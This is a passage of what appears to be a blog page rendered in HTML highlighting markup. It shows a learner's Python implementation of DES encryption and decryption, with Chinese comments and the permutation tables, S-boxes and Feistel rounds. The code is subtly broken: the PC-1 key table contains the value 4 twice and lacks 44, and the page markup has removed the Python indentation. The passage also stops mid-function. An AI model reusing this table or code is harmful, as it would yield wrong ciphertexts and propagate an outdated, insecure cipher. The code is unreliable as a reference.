class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ip = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>,</span><br><span class="line"><span class="number">15</span>, <span class="number">7</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, </span><br><span class="line"><span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆矩阵</span></span><br><span class="line">_ip = [<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, </span><br><span class="line"><span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, </span><br><span class="line"><span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, </span><br><span class="line"><span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化c、d数组</span></span><br><span class="line">c = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">d = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">k = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左右32位数组</span></span><br><span class="line">l = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">r = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_secretkey</span><span class="params">(key, round)</span>:</span></span><br><span class="line">pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, </span><br><span class="line"><span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">62</span>, <span class="number">54</span>, </span><br><span class="line"><span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, </span><br><span class="line"><span class="number">4</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>]</span><br><span class="line">respc1 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">respc1 += key[pc1[i]]</span><br><span class="line">c[<span class="number">0</span>] = respc1[:<span class="number">28</span>]</span><br><span class="line">d[<span class="number">0</span>] = respc1[<span class="number">28</span>:]</span><br><span class="line">k[<span class="number">0</span>] = c[<span class="number">0</span>] + d[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,round+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">16</span>):</span><br><span class="line"><span class="comment"># 左移1位</span></span><br><span class="line">c[i] = c[i<span class="number">-1</span>][<span class="number">1</span>:] + c[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line">d[i] = d[i<span class="number">-1</span>][<span class="number">1</span>:] + d[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c[i] = c[i<span class="number">-1</span>][<span class="number">2</span>:] + c[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">d[i] = d[i<span class="number">-1</span>][<span class="number">2</span>:] + d[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">secret = c[round] + d[round]</span><br><span class="line">pc2 = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,</span><br><span class="line"><span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">s_key = <span class="string">""</span> <span class="comment"># 生成本轮最终秘钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">s_key += secret[pc2[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> s_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始置换，输入为64位数据，8个ascii字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">re = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">re += data[ip[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展置换，输入为32位数据，输出为48位数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">e_box = [<span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, </span><br><span class="line"><span class="number">12</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, </span><br><span class="line"><span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span>]</span><br><span class="line">re = [<span class="string">'a'</span>] * <span class="number">48</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">re[i] = data[e_box[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥加处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_plus</span><span class="params">(data, key)</span>:</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">out += str(int(data[i])^int(key[i]))</span><br><span class="line"><span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># s盒置换，输入48位，输出32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">s1 = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>],</span><br><span class="line">[<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>]]</span><br><span class="line">s2 = [[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">[<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>]]</span><br><span class="line">s3 = [[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line">s4 = [[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>],</span><br><span class="line">[<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>]]</span><br><span class="line">s5 = [[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">[<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>],</span><br><span class="line">[<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]]</span><br><span class="line">s6 = [[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>]]</span><br><span class="line">s7 = [[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">[<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>]]</span><br><span class="line">s8 = [[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">[<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">re = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>//<span class="number">6</span>):</span><br><span class="line">    re.append(data[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始进行s盒置换</span></span><br><span class="line">dic = [s1,s2,s3,s4,s5,s6,s7,s8]</span><br><span class="line">retn = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">r = int(re[i][<span class="number">0</span>] + re[i][<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">c = int(re[i][<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">temp = str(bin(dic[i][r][c]))[<span class="number">2</span>:]</span><br><span class="line">temp = <span class="string">"0"</span>*(<span class="number">4</span>-len(temp)) + temp</span><br><span class="line">retn += temp</span><br><span class="line"><span class="comment"># print(len(retn))</span></span><br><span class="line"><span class="keyword">return</span> retn</span><br><span class="line"></span><br><span class="line"><span class="comment"># p盒置换，输入输出均为32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">p = [<span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, </span><br><span class="line"><span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">24</span>]</span><br><span class="line">re = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">re  += data[p[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># F函数，32位数据，子秘钥，轮数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_function</span><span class="params">(data, key, round)</span>:</span></span><br><span class="line">cipher = data   <span class="comment"># 左侧32位</span></span><br><span class="line">cipher = e_replace(cipher)</span><br><span class="line">cipher = secret_plus(cipher, key)</span><br><span class="line">cipher = s_replace(cipher)</span><br><span class="line">cipher = p_replace(cipher)</span><br><span class="line"><span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_key_bin</span><span class="params">(key)</span>:</span></span><br><span class="line">word = key</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> word:</span><br><span class="line">key += <span class="string">f'<span class="subst">&#123;bin(ord(i))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">8</span>&#125;</span>'</span></span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span><span class="params">(ptext, key)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">l[i] = <span class="string">""</span></span><br><span class="line">r[i] = <span class="string">""</span></span><br><span class="line">key = convert_key_bin(key)</span><br><span class="line">cipher = init_replace(ptext)</span><br><span class="line">l[<span class="number">0</span>] = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">r[<span class="number">0</span>] = cipher[<span class="number">32</span>:]</span><br><span class="line"><span class="comment"># 进行16层循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">l[i] = r[i<span class="number">-1</span>]</span><br><span class="line">secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">f_result = f_function(r[i<span class="number">-1</span>],secret_key,i)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">r[i] += str(int(l[i<span class="number">-1</span>][j])^int(f_result[j]))</span><br><span class="line">secret_key = generate_secretkey(key,<span class="number">16</span>)</span><br><span class="line">f_result = f_function(r[<span class="number">15</span>],secret_key,<span class="number">16</span>)</span><br><span class="line">l[<span class="number">16</span>] = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">l[<span class="number">16</span>] += str(int(l[<span class="number">15</span>][j])^int(f_result[j]))</span><br><span class="line">r[<span class="number">16</span>] = r[<span class="number">15</span>]</span><br><span class="line">temp = l[<span class="number">16</span>] + r[<span class="number">16</span>]</span><br><span class="line">final_cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">final_cipher += temp[_ip[i]]</span><br><span class="line"><span class="keyword">return</span> <span class="string">f'<span class="subst">&#123;hex(int(final_cipher,<span class="number">2</span>))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">16</span>&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">l[i] = <span class="string">""</span></span><br><span class="line">r[i] = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复为64位密文</span></span><br><span class="line">key = convert_key_bin(key)</span><br><span class="line">temp = bin(int(cipher, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">cipher = <span class="string">"0"</span>*(<span class="number">64</span>-len(temp)) + temp</span><br><span class="line">cipher = init_replace(cipher)</span><br><span class="line">l[<span class="number">16</span>] = cipher[:<span class="number">32</span>]</span><br><span class="line">r[<span class="number">16</span>] = cipher[<span 